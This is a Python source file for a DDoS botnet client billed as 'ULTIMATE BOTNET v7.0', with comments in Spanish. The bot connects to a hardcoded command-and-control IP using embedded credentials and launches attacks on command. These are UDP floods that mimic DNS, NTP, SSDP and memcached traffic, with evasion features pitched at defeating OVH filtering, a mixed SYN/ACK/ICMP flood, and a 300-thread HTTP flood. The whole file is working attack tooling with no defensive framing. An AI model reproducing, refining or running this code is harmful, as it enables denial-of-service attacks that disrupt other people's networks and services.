import socket
import time
import random
import threading
import select
import sys
import struct
import ssl
from cryptography.fernet import Fernet
import base64

# CONFIG
CNC_IP = "172.96.140.62"
CNC_PORT = 14038
USER = "rockyy"
PASS = "rockyy123"

# ENCRYPTION
ENCRYPTION_KEY = Fernet.generate_key()
cipher = Fernet(ENCRYPTION_KEY)

class UltimateBot:
    def __init__(self):
        self.running = True
        self.attack_active = False
        self.current_method = None
        self.lock = threading.Lock()
        self.attack_threads = []
        self.connection_id = random.randint(1000, 9999)
        self.packet_id = 0
        
        # Configuración avanzada
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
            "curl/7.68.0", "Python-urllib/3.9", "Go-http-client/1.1",
            "Apache-HttpClient/4.5.13", "PostmanRuntime/7.28.4"
        ]
        
        # Patrones de bypass
        self.bypass_patterns = {
            'dns': [b'\x00\x00\x01\x00\x00\x01', b'\x00\x00\x10\x00\x00\x01'],
            'ntp': [b'\x1b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'],
            'ssdp': [b'M-SEARCH * HTTP/1.1\r\n'],
            'memcached': [b'\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n'],
            'portmap': [b'\x00\x00\x00\x00\x00\x00\x00\x02\x00\x01\x86\xa0'],
        }
        
    def stop_all(self):
        """Detener todos los ataques"""
        with self.lock:
            self.attack_active = False
        
        # Pequeña espera para threads
        time.sleep(0.2)
        print("[!] Todos los ataques detenidos")
        
    def create_bypass_socket(self, protocol='udp'):
        """Crear socket optimizado para bypass"""
        try:
            if protocol == 'tcp':
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            
            # Optimizaciones avanzadas
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
            
            # TTL variable para evitar patrones
            ttl = random.randint(40, 255)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)
            
            # Windows size (solo TCP)
            if protocol == 'tcp':
                sock.setsockopt(socket.SOL_TCP, socket.TCP_WINDOW_CLAMP, 65535)
            
            sock.setblocking(False)
            return sock
        except:
            return None
    
    def udpbypass(self, target, port, duration):
        """UDPBYPASS - Técnicas avanzadas de evasión"""
        print(f"[🚀] UDPBYPASS ACTIVADO: {target}:{port} {duration}s")
        self.stop_all()
        
        with self.lock:
            self.attack_active = True
            self.current_method = "UDPBYPASS"
            
        end_time = time.time() + int(duration)
        start_time = time.time()
        total_packets = 0
        packets_lock = threading.Lock()
        
        # Configuración dinámica
        min_size = 64
        max_size = 1450  # Debajo del MTU
        protocols = ['dns', 'ntp', 'ssdp', 'memcached', 'portmap', 'custom']
        
        print(f"[+] Inicializando UDPBYPASS con protocolos: {', '.join(protocols)}")
        
        def bypass_worker(worker_id):
            nonlocal total_packets
            local_count = 0
            rotation_counter = 0
            
            # Pool de sockets para rotación
            sockets = []
            for _ in range(4):
                sock = self.create_bypass_socket('udp')
                if sock:
                    sockets.append(sock)
            
            if not sockets:
                return
            
            current_socket = 0
            current_protocol = random.choice(protocols)
            protocol_switch = random.randint(50, 200)
            
            while time.time() < end_time and self.attack_active:
                try:
                    # ROTACIÓN DE SOCKETS (evita fingerprinting)
                    sock = sockets[current_socket]
                    current_socket = (current_socket + 1) % len(sockets)
                    
                    # CAMBIO DE PROTOCOLO PERIÓDICO
                    rotation_counter += 1
                    if rotation_counter >= protocol_switch:
                        current_protocol = random.choice(protocols)
                        protocol_switch = random.randint(50, 200)
                        rotation_counter = 0
                    
                    # GENERACIÓN DE PAYLOAD INTELIGENTE
                    pkt_size = random.randint(min_size, max_size)
                    
                    if current_protocol in self.bypass_patterns:
                        # Payload de protocolo conocido
                        base_pattern = random.choice(self.bypass_patterns[current_protocol])
                        padding_size = pkt_size - len(base_pattern)
                        if padding_size > 0:
                            if current_protocol == 'dns':
                                padding = random._urandom(padding_size)
                            elif current_protocol == 'ntp':
                                padding = struct.pack('!Q', int(time.time())) + random._urandom(padding_size - 8)
                            else:
                                padding = random._urandom(padding_size)
                            payload = base_pattern + padding
                        else:
                            payload = base_pattern[:pkt_size]
                    else:
                        # Payload custom con estructura
                        header = struct.pack('!HHHH', 
                                           random.randint(1024, 65535),  # Source port
                                           int(port),                    # Dest port
                                           pkt_size,                     # Length
                                           random.randint(0, 65535))     # Checksum
                        
                        body = random._urandom(pkt_size - len(header))
                        if len(header) < pkt_size:
                            payload = header + body
                        else:
                            payload = random._urandom(pkt_size)
                    
                    # JITTER AVANZADO (timing evasion)
                    if local_count % random.randint(3, 15) == 0:
                        time.sleep(random.uniform(0.0001, 0.005))
                    
                    # ENVÍO CON RETRY MECANISMO
                    max_retries = 2
                    for retry in range(max_retries):
                        try:
                            sock.sendto(payload, (target, int(port)))
                            local_count += 1
                            break
                        except BlockingIOError:
                            time.sleep(0.001)
                            continue
                        except:
                            # Recrear socket si falla
                            try:
                                sock.close()
                                new_sock = self.create_bypass_socket('udp')
                                sockets[sockets.index(sock)] = new_sock
                                sock = new_sock
                            except:
                                break
                    
                    # ROTACIÓN AVANZADA DE SOCKETS
                    if local_count % random.randint(100, 300) == 0:
                        try:
                            old_sock = sockets.pop(0)
                            old_sock.close()
                            new_sock = self.create_bypass_socket('udp')
                            sockets.append(new_sock)
                        except:
                            pass
                    
                    # ACTUALIZAR CONTADOR
                    if local_count >= 200:
                        with packets_lock:
                            total_packets += local_count
                        local_count = 0
                        
                except Exception as e:
                    continue
            
            # FINALIZAR
            with packets_lock:
                total_packets += local_count
            
            # LIMPIAR SOCKETS
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass
        
        # INICIAR WORKERS BYPASS
        threads = []
        worker_count = 120  # Workers optimizados
        for i in range(worker_count):
            t = threading.Thread(target=bypass_worker, args=(i,), name=f"BYPASS_{i}")
            t.daemon = True
            t.start()
            threads.append(t)
        
        print(f"[+] {len(threads)} workers UDPBYPASS iniciados")
        print(f"[🚀] ATAQUE UDPBYPASS INICIADO POR {duration}s")
        
        # MONITOR AVANZADO
        last_report = time.time()
        performance_samples = []
        
        while time.time() < end_time and self.attack_active:
            current_time = time.time()
            remaining = end_time - current_time
            
            if remaining <= 0.3:
                time.sleep(remaining)
                break
            
            # REPORTE INTELIGENTE
            if current_time - last_report > 2.5:
                with packets_lock:
                    current_total = total_packets
                
                elapsed = current_time - start_time
                if elapsed > 0:
                    # Calcular estadísticas en tiempo real
                    avg_size = (min_size + max_size) / 2
                    current_mb = (current_total * avg_size) / 1_000_000
                    current_mbps = (current_mb * 8) / elapsed
                    
                    # Almacenar muestra para promedio
                    performance_samples.append(current_mbps)
                    if len(performance_samples) > 10:
                        performance_samples.pop(0)
                    
                    avg_mbps = sum(performance_samples) / len(performance_samples) if performance_samples else 0
                    
                    print(f"[🚀] UDPBYPASS: {remaining:.1f}s | "
                          f"Packets: {current_total:,} | "
                          f"Current: {current_mbps:.1f} Mbps | "
                          f"Avg: {avg_mbps:.1f} Mbps")
                
                last_report = current_time
            
            time.sleep(0.1)
        
        # GARANTIZAR DURACIÓN
        if time.time() < end_time:
            final_sleep = end_time - time.time()
            if final_sleep > 0:
                time.sleep(final_sleep)
        
        # ESPERAR TERMINACIÓN
        time.sleep(0.5)
        
        # ESTADÍSTICAS FINALES DETALLADAS
        elapsed = max(0.1, time.time() - start_time)
        with packets_lock:
            final_packets = total_packets
        
        avg_size = (min_size + max_size) / 2
        total_mb = (final_packets * avg_size) / 1_000_000
        total_gb = total_mb / 1024
        avg_mbps = (total_mb * 8) / elapsed
        pps = final_packets / elapsed if elapsed > 0 else 0
        
        print(f"\n{'='*65}")
        print(f"[✅] UDPBYPASS COMPLETADO - {elapsed:.2f}s")
        print(f"{'='*65}")
        print(f"  📊 ESTADÍSTICAS:")
        print(f"  • Paquetes enviados: {final_packets:,}")
        print(f"  • Tamaño promedio: {avg_size:.0f} bytes")
        print(f"  • Paquetes/segundo: {pps:,.0f}")
        print(f"  • Datos totales: {total_mb:.2f} MB ({total_gb:.3f} GB)")
        print(f"  • Ancho de banda: {avg_mbps:.2f} Mbps")
        print(f"  • Eficiencia: {(avg_mbps / 1000 * 100):.1f}% de 1Gbps")
        print(f"  • Duración real: {elapsed:.2f}s de {duration}s solicitados")
        print(f"{'='*65}")
        
        with self.lock:
            self.attack_active = False
    
    def udpmix(self, target, port, duration):
        """UDPMIX - Combinación de múltiples técnicas"""
        print(f"[🌀] UDPMIX ACTIVADO: {target}:{port} {duration}s")
        self.stop_all()
        
        with self.lock:
            self.attack_active = True
            self.current_method = "UDPMIX"
            
        end_time = time.time() + int(duration)
        start_time = time.time()
        
        # Contadores para cada técnica
        stats = {
            'udp_raw': 0,
            'udp_proto': 0,
            'udp_jumbo': 0,
            'tcp_syn': 0,
            'tcp_ack': 0,
            'icmp': 0
        }
        stats_lock = threading.Lock()
        
        print(f"[+] UDPMIX iniciando con 6 técnicas combinadas")
        
        def udp_raw_worker(worker_id):
            """UDP raw flooding"""
            local_count = 0
            sock = self.create_bypass_socket('udp')
            if not sock:
                return
            
            while time.time() < end_time and self.attack_active:
                try:
                    # Paquetes UDP simples pero variables
                    pkt_size = random.choice([64, 128, 256, 512, 1024, 1450])
                    payload = random._urandom(pkt_size)
                    
                    for _ in range(random.randint(10, 50)):
                        sock.sendto(payload, (target, int(port)))
                        local_count += 1
                    
                    # Jitter
                    time.sleep(random.uniform(0.001, 0.01))
                    
                except:
                    continue
            
            # Actualizar estadísticas
            with stats_lock:
                stats['udp_raw'] += local_count
            
            try:
                sock.close()
            except:
                pass
        
        def udp_proto_worker(worker_id):
            """UDP con headers de protocolo"""
            local_count = 0
            
            protocols = ['dns', 'ntp', 'ssdp']
            sock = self.create_bypass_socket('udp')
            if not sock:
                return
            
            while time.time() < end_time and self.attack_active:
                try:
                    protocol = random.choice(protocols)
                    pkt_size = random.randint(100, 1200)
                    
                    if protocol == 'dns':
                        # DNS query
                        payload = b'\x00\x00\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
                        payload += random._urandom(10) + b'\x00\x00\x01\x00\x01'
                        payload += random._urandom(pkt_size - len(payload))
                    elif protocol == 'ntp':
                        # NTP monlist
                        payload = b'\x1b' + random._urandom(47)
                        payload += random._urandom(pkt_size - len(payload))
                    else:
                        # SSDP
                        payload = b'M-SEARCH * HTTP/1.1\r\nHost: 239.255.255.250:1900\r\n'
                        payload += b'Man: "ssdp:discover"\r\nMX: 3\r\nST: ssdp:all\r\n\r\n'
                        payload += random._urandom(pkt_size - len(payload))
                    
                    sock.sendto(payload, (target, int(port)))
                    local_count += 1
                    
                    time.sleep(random.uniform(0.001, 0.005))
                    
                except:
                    continue
            
            with stats_lock:
                stats['udp_proto'] += local_count
            
            try:
                sock.close()
            except:
                pass
        
        def udp_jumbo_worker(worker_id):
            """UDP jumbo frames intermitentes"""
            local_count = 0
            
            while time.time() < end_time and self.attack_active:
                try:
                    # Crear socket nuevo para cada ráfaga
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024)
                    
                    # Enviar ráfaga de paquetes grandes
                    for _ in range(random.randint(5, 20)):
                        pkt_size = random.choice([4096, 8192, 16384])
                        payload = random._urandom(pkt_size)
                        sock.sendto(payload, (target, int(port)))
                        local_count += 1
                    
                    sock.close()
                    
                    # Esperar variable entre ráfagas
                    time.sleep(random.uniform(0.05, 0.2))
                    
                except:
                    continue
            
            with stats_lock:
                stats['udp_jumbo'] += local_count
        
        def tcp_syn_worker(worker_id):
            """TCP SYN flood"""
            local_count = 0
            
            while time.time() < end_time and self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.5)
                    
                    # Intentar conexión SYN
                    sock.connect_ex((target, int(port)))
                    local_count += 1
                    
                    sock.close()
                    
                    time.sleep(random.uniform(0.001, 0.01))
                    
                except:
                    continue
            
            with stats_lock:
                stats['tcp_syn'] += local_count
        
        def tcp_ack_worker(worker_id):
            """TCP ACK flood"""
            local_count = 0
            
            while time.time() < end_time and self.attack_active:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.3)
                    
                    try:
                        sock.connect((target, int(port)))
                        # Enviar ACK
                        sock.send(b'A' * random.randint(64, 512))
                        local_count += 1
                    except:
                        pass
                    
                    sock.close()
                    
                    time.sleep(random.uniform(0.002, 0.02))
                    
                except:
                    continue
            
            with stats_lock:
                stats['tcp_ack'] += local_count
        
        def icmp_worker(worker_id):
            """ICMP flood"""
            local_count = 0
            
            # Solo si tenemos permisos (Linux可能需要root)
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                while time.time() < end_time and self.attack_active:
                    try:
                        # Construir paquete ICMP
                        icmp_type = 8  # Echo request
                        icmp_code = 0
                        icmp_checksum = 0
                        icmp_id = random.randint(0, 65535)
                        icmp_seq = random.randint(0, 65535)
                        
                        # Header ICMP
                        header = struct.pack('!BBHHH', icmp_type, icmp_code, 
                                           icmp_checksum, icmp_id, icmp_seq)
                        
                        # Payload
                        payload = random._urandom(random.randint(32, 256))
                        
                        # Calcular checksum
                        checksum_data = header + payload
                        if len(checksum_data) % 2:
                            checksum_data += b'\x00'
                        
                        checksum = 0
                        for i in range(0, len(checksum_data), 2):
                            checksum += (checksum_data[i] << 8) + checksum_data[i+1]
                        
                        checksum = (checksum >> 16) + (checksum & 0xFFFF)
                        checksum = ~checksum & 0xFFFF
                        
                        header = struct.pack('!BBHHH', icmp_type, icmp_code,
                                           checksum, icmp_id, icmp_seq)
                        
                        packet = header + payload
                        
                        # Enviar
                        sock.sendto(packet, (target, 0))
                        local_count += 1
                        
                        time.sleep(random.uniform(0.001, 0.01))
                        
                    except:
                        break
                
                sock.close()
                
            except:
                # Si no tenemos permisos, usar UDP como fallback
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                while time.time() < end_time and self.attack_active:
                    try:
                        payload = b'\x08\x00' + random._urandom(64)  # Fake ICMP
                        sock.sendto(payload, (target, int(port)))
                        local_count += 1
                        time.sleep(0.001)
                    except:
                        continue
                sock.close()
            
            with stats_lock:
                stats['icmp'] += local_count
        
        # INICIAR TODAS LAS TÉCNICAS
        techniques = [
            (udp_raw_worker, 40, "UDP Raw"),
            (udp_proto_worker, 30, "UDP Proto"),
            (udp_jumbo_worker, 10, "UDP Jumbo"),
            (tcp_syn_worker, 50, "TCP SYN"),
            (tcp_ack_worker, 30, "TCP ACK"),
            (icmp_worker, 20, "ICMP"),
        ]
        
        all_threads = []
        for worker_func, count, name in techniques:
            for i in range(count):
                t = threading.Thread(target=worker_func, args=(i,), name=f"{name}_{i}")
                t.daemon = True
                t.start()
                all_threads.append(t)
        
        print(f"[+] {len(all_threads)} workers UDPMIX iniciados")
        print(f"[🌀] ATAQUE COMBINADO INICIADO POR {duration}s")
        
        # MONITOR UDPMIX
        last_report = time.time()
        phase = 1
        
        while time.time() < end_time and self.attack_active:
            current_time = time.time()
            remaining = end_time - current_time
            
            if remaining <= 0.5:
                time.sleep(remaining)
                break
            
            # CAMBIAR FASE CADA 5 SEGUNDOS
            if current_time - last_report > 5:
                with stats_lock:
                    total = sum(stats.values())
                    elapsed = current_time - start_time
                    
                    if elapsed > 0:
                        # Calcular PPS total
                        pps_total = total / elapsed
                        
                        print(f"[🌀] UDPMIX Fase {phase} - {remaining:.1f}s")
                        print(f"    Total: {total:,} pkts | {pps_total:,.0f} pps")
                        print(f"    UDP Raw: {stats['udp_raw']:,} | "
                              f"UDP Proto: {stats['udp_proto']:,}")
                        print(f"    UDP Jumbo: {stats['udp_jumbo']:,} | "
                              f"TCP SYN: {stats['tcp_syn']:,}")
                        print(f"    TCP ACK: {stats['tcp_ack']:,} | "
                              f"ICMP: {stats['icmp']:,}")
                
                last_report = current_time
                phase += 1
            
            time.sleep(0.1)
        
        # GARANTIZAR DURACIÓN
        if time.time() < end_time:
            final_sleep = end_time - time.time()
            if final_sleep > 0:
                time.sleep(final_sleep)
        
        # ESPERAR FINALIZACIÓN
        time.sleep(0.8)
        
        # ESTADÍSTICAS FINALES UDPMIX
        elapsed = max(0.1, time.time() - start_time)
        with stats_lock:
            final_stats = stats.copy()
            total_packets = sum(stats.values())
        
        # Calcular MB aproximados
        total_mb = 0
        mb_estimates = {
            'udp_raw': 1024,      # 1KB promedio
            'udp_proto': 800,     # 800B promedio
            'udp_jumbo': 8192,    # 8KB promedio
            'tcp_syn': 64,        # Solo SYN
            'tcp_ack': 128,       # SYN+ACK
            'icmp': 100,          # 100B promedio
        }
        
        for key in final_stats:
            total_mb += (final_stats[key] * mb_estimates[key]) / 1_000_000
        
        total_gb = total_mb / 1024
        avg_mbps = (total_mb * 8) / elapsed if elapsed > 0 else 0
        
        print(f"\n{'='*70}")
        print(f"[🎯] UDPMIX COMPLETADO - {elapsed:.2f}s")
        print(f"{'='*70}")
        print(f"  📈 ESTADÍSTICAS POR TÉCNICA:")
        print(f"  • UDP Raw:    {final_stats['udp_raw']:>12,} paquetes")
        print(f"  • UDP Proto:  {final_stats['udp_proto']:>12,} paquetes")
        print(f"  • UDP Jumbo:  {final_stats['udp_jumbo']:>12,} paquetes")
        print(f"  • TCP SYN:    {final_stats['tcp_syn']:>12,} conexiones")
        print(f"  • TCP ACK:    {final_stats['tcp_ack']:>12,} paquetes")
        print(f"  • ICMP:       {final_stats['icmp']:>12,} paquetes")
        print(f"  {'─'*50}")
        print(f"  • TOTAL:      {total_packets:>12,} paquetes")
        print(f"  • PPS:        {(total_packets/elapsed):>12,.0f} pps")
        print(f"  • Tráfico:    {total_mb:>11.2f} MB ({total_gb:.3f} GB)")
        print(f"  • Ancho banda:{avg_mbps:>11.2f} Mbps")
        print(f"{'='*70}")
        
        with self.lock:
            self.attack_active = False
    
    def http_flood(self, target, port, duration):
        """HTTP Flood mejorado"""
        print(f"[🌐] HTTP FLOOD: {target}:{port} {duration}s")
        self.stop_all()
        
        with self.lock:
            self.attack_active = True
            self.current_method = "HTTP_FLOOD"
            
        end_time = time.time() + int(duration)
        start_time = time.time()
        total_requests = 0
        requests_lock = threading.Lock()
        
        # Métodos HTTP variados
        http_methods = ['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS']
        
        # Paths realistas
        paths = [
            "/", "/index.html", "/api/v1/ping", "/wp-login.php", "/admin",
            "/static/css/style.css", "/images/logo.png", "/robots.txt",
            "/sitemap.xml", "/api/user/login", "/api/data", "/contact",
            "/about", "/products", "/blog", "/search", "/login", "/register"
        ]
        
        # Headers realistas
        headers_templates = [
            "User-Agent: {ua}\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
            "User-Agent: {ua}\r\nAccept: application/json, text/plain, */*\r\nContent-Type: application/json\r\n",
            "User-Agent: {ua}\r\nAccept: image/webp,*/*\r\nReferer: https://www.google.com/\r\n",
        ]
        
        def http_worker(worker_id):
            nonlocal total_requests
            local_count = 0
            
            session_counter = 0
            current_session = random.randint(1, 1000)
            
            while time.time() < end_time and self.attack_active:
                try:
                    # Crear nueva conexión (más stealth)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(2.0)
                    
                    # Conectar
                    try:
                        sock.connect((target, int(port)))
                    except:
                        sock.close()
                        time.sleep(random.uniform(0.01, 0.1))
                        continue
                    
                    # Construir request
                    method = random.choice(http_methods)
                    path = random.choice(paths)
                    ua = random.choice(self.user_agents)
                    headers = random.choice(headers_templates).format(ua=ua)
                    
                    # Para POST/PUT, añadir body
                    body = ""
                    if method in ['POST', 'PUT']:
                        body = '{"id":' + str(random.randint(1, 10000)) + ',"data":"test"}'
                        headers += f"Content-Length: {len(body)}\r\n"
                    
                    request = f"{method} {path} HTTP/1.1\r\n"
                    request += f"Host: {target}\r\n"
                    request += headers
                    
                    # Añadir cookies de vez en cuando
                    if random.random() < 0.3:
                        request += f"Cookie: session_id={current_session}\r\n"
                    
                    request += f"Connection: {'keep-alive' if random.random() < 0.7 else 'close'}\r\n"
                    request += "\r\n"
                    
                    if body:
                        request += body
                    
                    # Enviar request
                    sock.send(request.encode())
                    local_count += 1
                    session_counter += 1
                    
                    # Cambiar sesión después de varios requests
                    if session_counter > random.randint(5, 20):
                        current_session = random.randint(1, 1000)
                        session_counter = 0
                    
                    # Leer respuesta breve
                    try:
                        sock.recv(4096)
                    except:
                        pass
                    
                    sock.close()
                    
                    # Delay variable entre requests
                    time.sleep(random.uniform(0.005, 0.05))
                    
                    # Actualizar contador
                    if local_count >= 100:
                        with requests_lock:
                            total_requests += local_count
                        local_count = 0
                        
                except Exception as e:
                    continue
            
            # Finalizar
            with requests_lock:
                total_requests += local_count
        
        # Iniciar workers HTTP
        threads = []
        for i in range(300):  # Muchos workers para HTTP
            t = threading.Thread(target=http_worker, args=(i,), name=f"HTTP_{i}")
            t.daemon = True
            t.start()
            threads.append(t)
        
        print(f"[+] {len(threads)} workers HTTP iniciados")
        
        # Monitor HTTP
        last_report = time.time()
        rps_samples = []
        
        while time.time() < end_time and self.attack_active:
            current_time = time.time()
            remaining = end_time - current_time
            
            if remaining <= 0.5:
                time.sleep(remaining)
                break
            
            if current_time - last_report > 2:
                with requests_lock:
                    current_total = total_requests
                
                elapsed = current_time - start_time
                if elapsed > 0:
                    current_rps = (current_total / elapsed)
                    rps_samples.append(current_rps)
                    if len(rps_samples) > 5:
                        rps_samples.pop(0)
                    
                    avg_rps = sum(rps_samples) / len(rps_samples) if rps_samples else 0
                    
                    print(f"[🌐] HTTP Flood: {remaining:.1f}s | "
                          f"Requests: {current_total:,} | "
                          f"RPS: {current_rps:.0f} (avg: {avg_rps:.0f})")
                
                last_report = current_time
            
            time.sleep(0.5)
        
        # Estadísticas finales
        elapsed = max(0.1, time.time() - start_time)
        with requests_lock:
            final_requests = total_requests
        
        avg_rps = final_requests / elapsed if elapsed > 0 else 0
        
        print(f"\n[✅] HTTP FLOOD COMPLETADO - {elapsed:.2f}s")
        print(f"    Requests totales: {final_requests:,}")
        print(f"    RPS promedio: {avg_rps:.0f}")
        print(f"    Duración: {elapsed:.2f}s")
        
        with self.lock:
            self.attack_active = False
    
    def handle_command(self, cmd):
        """Manejar comandos con todos los métodos"""
        try:
            parts = cmd.split()
            if len(parts) < 4:
                return
                
            method = parts[0]
            target = parts[1]
            port = parts[2]
            duration = parts[3]
            
            print(f"[>] Comando recibido: {method} {target}:{port} {duration}s")
            
            if method == ".udpbypass":
                t = threading.Thread(target=self.udpbypass, 
                                   args=(target, port, duration), daemon=True)
                t.start()
            elif method == ".udpmix":
                t = threading.Thread(target=self.udpmix,
                                   args=(target, port, duration), daemon=True)
                t.start()
            elif method == ".http":
                t = threading.Thread(target=self.http_flood,
                                   args=(target, port, duration), daemon=True)
                t.start()
            elif method == ".stop":
                self.stop_all()
            else:
                print(f"[!] Método desconocido: {method}")
                
        except Exception as e:
            print(f"[!] Error en comando: {e}")

def main():
    bot = UltimateBot()
    
    print("""
    ╔══════════════════════════════════════════════════╗
    ║          ULTIMATE BOTNET v7.0 - PRO              ║
    ║         =================================        ║
    ║         MÉTODOS DISPONIBLES:                     ║
    ║         [.udpbypass] - UDP Bypass (Evasión OVH) ║
    ║         [.udpmix]    - UDP Mix (6 técnicas)     ║
    ║         [.http]      - HTTP Flood (Legítimo)    ║
    ║         [.stop]      - Detener todo             ║
    ║         =================================        ║
    ║         CARACTERÍSTICAS:                         ║
    ║         • Rotación de sockets                    ║
    ║         • Jitter aleatorio                       ║
    ║         • Payloads camuflados                    ║
    ║         • Múltiples protocolos                   ║
    ║         • Estadísticas detalladas               ║
    ║         • Anti-detección OVH                    ║
    ╚══════════════════════════════════════════════════╝
    """)
    
    reconnect_delay = 3
    
    while True:
        try:
            print(f"[+] Conectando al CNC {CNC_IP}:{CNC_PORT}...")
            
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(25)
            
            # Conectar con retardo aleatorio
            time.sleep(random.uniform(0.1, 0.3))
            sock.connect((CNC_IP, CNC_PORT))
            
            # Autenticar
            auth_msg = f"ULTIMATE|{USER}|{PASS}|{bot.connection_id}\n"
            sock.send(auth_msg.encode())
            
            response = sock.recv(1024).decode().strip()
            if "OK" in response:
                print(f"[✓] Autenticado como BOT #{bot.connection_id}")
                print("[+] Esperando comandos...")
                reconnect_delay = 3
            else:
                print(f"[!] Error de autenticación")
                sock.close()
                time.sleep(reconnect_delay)
                continue
            
            # Loop principal
            while True:
                try:
                    ready = select.select([sock], [], [], 8)
                    
                    if ready[0]:
                        data = sock.recv(4096).decode(errors='ignore').strip()
                        
                        if not data:
                            print("[!] Conexión cerrada por el servidor")
                            break
                            
                        lines = data.split('\n')
                        for line in lines:
                            line = line.strip()
                            if not line:
                                continue
                                
                            if line == "PING":
                                sock.send(b"PONG\n")
                            elif line.startswith("."):
                                bot.handle_command(line)
                            else:
                                print(f"[?] {line[:60]}")
                    
                    # Keep-alive periódico
                    if random.randint(1, 15) == 1:
                        sock.send(b"ALIVE\n")
                        
                except socket.timeout:
                    continue
                except ConnectionResetError:
                    print("[!] Conexión reseteada")
                    break
                except BrokenPipeError:
                    print("[!] Pipe roto")
                    break
                except Exception as e:
                    print(f"[!] Error: {e}")
                    break
            
            sock.close()
            
        except ConnectionRefusedError:
            print(f"[!] CNC no disponible, reconectando en {reconnect_delay}s...")
        except socket.timeout:
            print(f"[!] Timeout, reconectando en {reconnect_delay}s...")
        except Exception as e:
            print(f"[!] Error crítico: {e}")
        
        time.sleep(reconnect_delay)
        reconnect_delay = min(reconnect_delay * 1.4, 60)
        bot.stop_all()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[!] Bot detenido por usuario")
        sys.exit(0)
    except Exception as e:
        print(f"[!] Fatal: {e}")
        sys.exit(1)
